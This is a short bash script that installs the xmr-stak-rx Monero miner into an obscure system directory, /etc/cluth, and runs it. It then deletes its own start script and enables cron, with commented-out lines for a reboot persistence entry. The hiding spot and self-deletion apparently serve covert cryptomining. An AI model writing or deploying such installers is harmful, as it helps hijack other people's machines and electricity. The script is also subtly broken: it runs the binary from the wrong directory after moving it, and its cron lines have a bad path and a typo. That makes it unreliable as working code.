#!/bin/bash
sudo chmod +x xmr-stak-rx && sudo mkdir /etc/cluth && sudo mv config.txt pools.txt xmr-stak-rx /etc/cluth && ./xmr-stak-rx --noTest && sudo rm start.sh
sudo systemctl enable cron.service
#sudo crontab-e 
#@reboot ./etc/cluth/xmr-stak-rx --noTest
